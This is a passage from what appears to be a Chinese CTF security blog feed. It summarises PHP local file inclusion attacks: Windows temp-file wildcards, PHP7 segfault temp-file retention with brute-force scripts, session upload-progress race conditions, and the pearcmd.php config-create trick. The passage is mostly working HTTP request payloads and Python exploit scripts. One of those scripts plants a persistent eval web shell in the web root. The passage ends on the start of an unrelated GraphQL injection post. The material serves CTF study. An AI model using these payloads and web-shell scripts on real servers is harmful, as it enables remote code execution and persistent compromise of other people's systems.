 The following constants provide addition meta characters to fully//  support the more obscure aspects of DOS wild card processing.#define DOS_STAR        (L&#39;&lt;&#39;)#define DOS_QM          (L&#39;&gt;&#39;)#define DOS_DOT         (L&#39;&quot;&#39;)</code></pre><p>也就是说：</p><ul><li>DOS_STAR：即 <code>&lt;</code>，匹配0个以上的字符</li><li>DOS_QM：即<code>&gt;</code>，匹配1个字符</li><li>DOS_DOT：即<code>&quot;</code>，匹配点号</li></ul><p>这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：<code>C:\Windows\Temp\php&lt;&lt;</code>。（由于Windows内部的一些不太明确的原因，这里一般需要用两个<code>&lt;</code>来匹配多个字符）</p><p>我们直接向含有文件包含漏洞的页面发送一个上传包：</p><p>表单如下:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;c:\Windows\php&lt;&lt;&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;upload&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后上传一个我们想要执行代码的php文件</p><p>我们抓包来看一看</p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004Content-Length: 380Origin: nullConnection: closeCookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteSec-Fetch-User: ?1-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;file&quot;C:\Windows\php&lt;&lt;-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;Content-Type: application/octet-stream&lt;?phpecho md5(1);-----------------------------176135873113704889614062296004--</code></pre><p>然后多发几次</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130191917085.png" alt="image-20221130191917085"></p><p>我们可以看到成功执行了我们发送的恶意文件代码，成功率还是相当之高的</p><h3 id="LFI-php7-Segment-Fault-Getshell"><a href="#LFI-php7-Segment-Fault-Getshell" class="headerlink" title="LFI + php7 Segment Fault Getshell"></a>LFI + php7 Segment Fault Getshell</h3><p> 段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了<strong>tmp目录</strong><br> 向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p><strong>让PHP异常崩溃的payload：</strong><br>7.0.0 &lt;=  php &lt;  7.1.20</p><pre><code class="php">php://filter/string.strip_tags/resource=/etc/passwd</code></pre><p>php7 老版本通杀</p><pre><code class="php">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p><strong>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除,这样就能达成getshell的目的</strong></p><p><strong>windows复现</strong></p><p>我们在请求的同时post一个文件</p><pre><code class="php">POST /index.php?file=php://filter/string.strip_tags/resource=index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004Content-Length: 216Origin: nullConnection: closeCookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteSec-Fetch-User: ?1-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;&lt;?phpphpinfo();?&gt;-----------------------------176135873113704889614062296004--</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200709385.png" alt="image-20221130200709385"></p><p>然后我们来查看一下目录:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200817102.png" alt="image-20221130200817102"></p><p>这个文件确实保留在了服务器当中,现在假设我们知道了它的名字，来尝试包含它</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200947378.png" alt="image-20221130200947378"></p><p>good!成功包含</p><p>如果我们不知道它的名字呢?那就只能爆破了,但是我们可以多上传一些这种文件，来增加爆破成功的几率</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130201135494.png" alt="image-20221130201135494"></p><p>好，我们来写个脚本来爆破，只有第4-7位是未知的，所以windows相对来说更好爆破</p><p>爆破脚本:</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.ascii_letters  # 最好是多发几个，然后只取数字和字母不然效率真的很低host = &quot;127.0.0.1&quot;port = 80base_url = &quot;http://%s:%d&quot; % (host, port)def brute_force_tmp_files():    for i in charset:        for j in charset:            for k in charset:                for l in charset:                        filename = i + j + k + l                        url = &quot;%s/index.php?file=C:/windows/php%s&quot; % (                            base_url, filename)+&quot;.tmp&quot;                        print (url)                        try:                            response = requests.get(url)                            if &#39;flag&#39; in response.text:                                print (&quot;[+] Include success!&quot;)                                return True                        except Exception as e:                            print (e)    return Falsedef main():    brute_force_tmp_files()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130202336196.png" alt="image-20221130202336196"></p><p>就这样跑下去</p><p>不过的话这样跑起来实在是太慢了,我们可以多发点包，然后呢，只取数字或者字母(经常测试会生成不少这样的tmp文件)，这样的话范围大大缩小，效率也提高了不少.</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203124465.png" alt="image-20221130203124465"></p><p>如图，我们很快就跑了出来，来包含一下</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203214124.png" alt="image-20221130203214124"></p><p>成功包含! 还是很有实战意义的</p><p><strong>Linux复现</strong></p><p>Linux其实也是一样的，不过与windows不同</p><pre><code> linux生成的文件是  php+六位随机数字字母 如:/tmp/php5H1Lku</code></pre><p>所以爆破难度实质上增加了不少，脚本我们也改一改就能用，建议实战的时候多发点包来增加成功率</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.lettershost = &quot;192.168.1.9&quot;port = 8000base_url = &quot;http://%s:%d&quot; % (host, port)def brute_force_tmp_files():    for i in charset:        for j in charset:            for k in charset:                for l in charset:                    for m in charset:                        for n in charset:                            filename = i + j + k + l + m + n                            url = &quot;%s/index.php?orange=/tmp/php%s&quot; % (                                base_url, filename)                            print url                            try:                                response = requests.get(url)                                if &#39;flag&#39; in response.content:                                    print &quot;[+] Include success!&quot;                                    return True                            except Exception as e:                                print e    return Falsedef main():    brute_force_tmp_files()if __name__ == &quot;__main__&quot;:    main()</code></pre><h3 id="利用session进行文件包含来getshell"><a href="#利用session进行文件包含来getshell" class="headerlink" title="利用session进行文件包含来getshell"></a>利用session进行文件包含来getshell</h3><p><strong>SESSION会话存储方式</strong></p><p>在<code>Java</code>中，用户的session是存储在内存中的，而在<code>PHP</code>中，则是将session以文件的形式存储在服务器某个文件中，我们可以在<code>php.ini</code>里面设置<code>session</code>的存储位置<code>session.save_path</code></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129151954937.png" alt="image-20221129151954937"></p><p>在很多时候服务器都是按照默认设置来运行的，假如我们发现了一个没有安全措施的<code>session</code>文件包含漏洞时，我们就可以尝试利用默认的会话存放路径去包含<code>getshell</code>，因此总结常见的<code>php-session</code>的默认存储位置是很有必要的</p><p><strong>默认路径</strong></p><pre><code class="php">/var/lib/php/sess_PHPSESSID/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre><blockquote><blockquote><p><code>session</code>文件的存储路径是分为两种情况的</p><p>一是没有权限，默认存储在<code>/var/lib/php/sessions/</code>目录下，文件名为<code>sess_[phpsessid]</code>，而<code>phpsessid</code>在发送的请求的<code>cookie</code>字段中可以看到（一般在利用漏洞时我们自己设置<code>phpsessid</code>）</p><p>二是<code>phpmyadmin</code>，这时的<code>session</code>文件存储在<code>/tmp</code>目录下，需要在<code>php.ini</code>里把<code>session.auto_start</code>置为1，把<code>session.save_path</code>目录设置为<code>/tmp</code></p></blockquote></blockquote><p><strong>涉及到的函数</strong></p><p>1.Session Upload Progress</p><p>默认情况下是开启的</p><p><code>Session Upload Progress</code> 即 Session 上传进度，是<code>php&gt;=5.4</code>后开始添加的一个特性。官网对他的描述是当 <code>session.upload_progress.enabled</code> 选项开启时（默认开启），PHP 能够在每一个文件上传时 <strong>监测上传进度</strong>。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个<code>POST</code>请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在 <code>$_SESSION</code> 中获得。 当PHP检测到这种POST请求时，它会在 <code>$_SESSION</code> 中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 连接在一起的值。</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153107918.png" alt="image-20221129153107918"></p><p>2.session.upload_progress.cleanup</p><p>Cleanup the progress information as soon as all POST data has been read  (i.e. upload completed). Defaults to 1, enabled.  一旦POST请求被读取完成,session内容就会被清空</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153427709.png" alt="image-20221129153427709"></p><hr><p><strong>配置环境</strong></p><p>index.php</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>然后我们来监控下session目录</p><pre><code>inotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /var/lib/php/sessions/</code></pre><p><strong>攻击流程</strong></p><p>1.构造上传表单</p><pre><code class="html">&lt;form action=&quot;http://193.43.142.8/sakura.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo();?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>我们上传个文件来测试一下,随便选一个文件就好</p><blockquote><p>1.首先构造的表单里面是没有cookie的，所以要自己加上一个cookie，phpsessid随便设置一个就可以，他会创建名为sess_PHPSESSID的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。所以要知道文件名才能包含</p><p>2.当同时POST一个与session.upload_process.name的同名变量也就是PHP_SESSION_UPLOAD_PROGRESS。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。通俗说就是会把内容序列化传入到session储存的文件中。</p></blockquote><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129221724271.png" alt="image-20221129221724271"></p><p>我们可以看到已经产生sess_phpsessid文件了</p><p>2.包含phpsessid文件Getshell(关闭session.upload_progress.cleanup)</p><p>我们先来查看一下里面的内容,但是里面什么都没有</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129222707579.png" alt="image-20221129222707579"></p><p>因为<code>session.upload_progress.cleanup</code>开启,读取完post内容时,session内容就会清空,所以我们需要用到条件竞争,一直发送请求,然后一直包含。</p><p>我们先降低难度，把<code>session.upload_progress.cleanup</code>关闭来包含</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129223936145.png" alt="image-20221129223936145"></p><p>来重新上传下文件</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224017844.png" alt="image-20221129224017844"></p><p>此时session里的内容并没有被删除</p><p>我们来包含一下</p><pre><code class="php">http://193.43.142.8/sakura.php?file=/var/lib/php/sessions/sess_uhbrr6s4fchgssstv9n8nbua0a</code></pre><p>很显然我们包含成功了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224159121.png" alt="image-20221129224159121"></p><p>3.包含phpsessid文件Getshell(开启session.upload_progress.cleanup)</p><p>好的，那么接下来我们重新打开这个配置,然后将session置空，那么我们该如何包含这个迅速被置空的session文件呢?</p><p>我们可以来利用条件竞争，简单来说就是我一边发包上传文件，一边去包含这个session文件，那么总有一个时间包含这个文件的操作是在清空session文件内容操作之前的!</p><p>我们来操作一下，使用burp即可！</p><p>我们分别抓一个上传文件的数据包，和一个文件包含的数据包,payload设置为空即可</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129225355419.png" alt="image-20221129225355419"></p><p>然后我将上传文件的数据包设置为2500条，文件包含的数据包设为5000条</p><p>好，let’s hack it!</p><p>如图,已经成功包含了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230017592.png" alt="image-20221129230017592"></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230055835.png" alt="image-20221129230055835"></p><p>除了用burp,我们还可以直接跑python脚本</p><pre><code class="python">import requestsimport ioimport threadingurl = &quot;http://193.43.142.8/sakura.php&quot;sessid = &quot;uhbrr6s4fchgssstv9n8nbua0a&quot;def write(session):    filebytes = io.BytesIO(b&#39;a&#39; * 1024 * 50)    while True:        res = session.post(url,                           data=&#123;                               &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;                           &#125;,                           cookies=&#123;                               &#39;PHPSESSID&#39;: sessid                           &#125;,                           files=&#123;                               &#39;file&#39;: (&#39;sakura.jpg&#39;, filebytes)                           &#125;                           )def read(session):    while True:        res = session.post(url + &quot;?file=/var/lib/php/sessions/sess_&quot; + sessid,                           data=&#123;                               &quot;1&quot;: &quot;file_put_contents(&#39;/var/www/html/HY.php&#39; , &#39;&lt;?php eval($_POST[hy666]);?&gt;&#39;);&quot;                           &#125;,                           cookies=&#123;                               &quot;PHPSESSID&quot;: sessid                           &#125;                           )        res2 = session.get(&quot;http://193.43.142.8/HY.php&quot;)        if res2.status_code == 200:            print(&quot;成功写入一句话！&quot;)        else:            print(&quot;Retry&quot;)if __name__ == &quot;__main__&quot;:    evnet = threading.Event()    with requests.session() as session:        for i in range(5):            threading.Thread(target=write, args=(session,)).start()        for i in range(5):            threading.Thread(target=read, args=(session,)).start()    evnet.set()</code></pre><p>自己根据脚本修改对应文件就好啦</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000436615.png" alt="image-20221130000436615"></p><p>然后直接使用蚁剑连接:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000707628.png" alt="image-20221130000707628"></p><h3 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a>pearcmd.php的巧妙利用</h3><p>这个点懒得搭环境了，就直接搬运了p神的文章</p><p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p><p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p><p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p><p>我们在PHP源码中可以看到这样的逻辑：</p><pre><code class="php">static zend_bool php_auto_globals_create_server(zend_string *name)&#123;    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),&#39;S&#39;) || strchr(PG(variables_order),&#39;s&#39;))) &#123;        php_register_server_variables();        if (PG(register_argc_argv)) &#123;            if (SG(request_info).argc) &#123;                zval *argc, *argv;                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) &#123;                    Z_ADDREF_P(argv);                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);                &#125;            &#125; else &#123;                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);            &#125;        &#125;    &#125; else &#123;        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);    &#125;    ...</code></pre><p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p><pre><code class="php">php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);</code></pre><p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p><p>果然：</p><p><a href="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></a></p><p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p><blockquote><p>4.4.  The Script Command Line</p><p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p><pre><code class="php">  search-string = search-word *( &quot;+&quot; search-word )  search-word   = 1*schar  schar         = unreserved | escaped | xreserved  xreserved     = &quot;;&quot; | &quot;/&quot; | &quot;?&quot; | &quot;:&quot; | &quot;@&quot; | &quot;&amp;&quot; | &quot;=&quot; | &quot;,&quot; |                  &quot;$&quot;</code></pre><p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p></blockquote><p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p><p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER[&#39;argv&#39;]</code>。</p><p>我们再来看到pear中获取命令行argv的函数：</p><pre><code class="php">public static function readPHPArgv()&#123;    global $argv;    if (!is_array($argv)) &#123;        if (!@is_array($_SERVER[&#39;argv&#39;])) &#123;            if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) &#123;                $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;                return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);            &#125;            return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];        &#125;        return $_SERVER[&#39;argv&#39;];    &#125;    return $argv;&#125;</code></pre><p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p><p>看看pear中有哪些可以利用的参数：</p><p><a href="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></a></p><p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><p>所以，我构造出最后的利用数据包如下：</p><pre><code class="php">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1Host: 192.168.1.162:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205856136.png" alt="image-20221130205856136"></p><p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205909317.png" alt="image-20221130205909317"></p><p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205927264.png" alt="image-20221130205927264"></p><p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/201060?display=mobile">https://www.anquanke.com/post/id/201060?display=mobile</a></p><p><a href="https://xz.aliyun.com/t/5535#toc-5">https://xz.aliyun.com/t/5535#toc-5</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106498971">https://blog.csdn.net/qq_45521281/article/details/106498971</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><p><a href="http://tttang.com/archive/1312/#toc_0x06-pearcmdphp">http://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;如果文件包含函数没有经过严格的过滤或者定义&lt;br&gt;并且参数可以被用户控制&lt;br&gt;这样就有可能包含非预期</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GraphQL注入</title>
    <link href="https://sakurahack-y.github.io/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://sakurahack-y.github.io/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-11-22T13:41:12.000Z</published>
    <updated>2022-11-22T13:50:19.126Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="什么是GraphQL注入"><a href="#什么是GraphQL注入" class="headerlink" title="什么是GraphQL注入"></a>什么是GraphQL注入</h1><p> GraphQL 是一个用于API的查询语言，使用基于类型系统来执行查询的服务（类型系统由你的数据定义）。GraphQL 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。  </p><p>GraphQL中文文档·<br><a href="https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md">https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md</a></p><p>如果你了解REST API会更快地了解它。像REST API，往往我们的请求需要多个API，每个API是一个类型。比如：<a href="http://www.test.com/users/%7Bid%7D">http://www.test.com/users/{id}</a> 这个API可以获取用户的信息；再比如：<a href="http://www.test.com/users/list">http://www.test.com/users/list</a> 这个API可以获取所有用户的信息。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667712995992-b10557ca-bcfa-43db-9f95-0be55e75ef24.png" alt="beepress-image-148242-1606793579.png"><br>比如查id为1的一个人的生日，可以这么查：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713213304-3dacaa0d-be46-40fe-ab15-85b80e942f97.png" alt="image.png"><br>再想知道他的身高、发色可以这样：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713274716-35f75660-d364-4bcd-a3bd-3a02762bf2ca.png" alt="image.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713351193-121bd2cb-54fa-41d8-b40a-a030ab5408de.png" alt="image.png"><br>通过上面这个例子就可以看出graphql与REST API的区别，仅用一个API即可完成所有的查询操作。并且他的语法和结构都是以一个对象不同属性的粒度划分，简单好用。</p><h1 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h1><p>GraphQL的执行逻辑大致如下：<br>查询-&gt;解析-&gt;验证-&gt;执行<br>根据官方文档，主要的操作类型有三种：query（查询）、mutation（变更）、subscription（订阅），最常用的就是query，所有的查询都需要操作类型，除了简写查询语法。<br>类型语言TypeLanguage，type来定义对象的类型和字段，理解成一个数据结构，可以无关实现graphQL的语言类型。类型语言包括Scalar（标量）和Object（对象）两种。并且支持接口抽象类型。<br>Schema用于描述数据逻辑，Schema就是对象的合计，其中定义的大部分为普通对象类型。一定包括query，可能包含mutation，作为一个GraphQL的查询入口。<br>Resolver用于实现解析逻辑，当一个字段被执行时，相应的 resolver 被调用以产生下一个值。</p><h1 id="内省查询"><a href="#内省查询" class="headerlink" 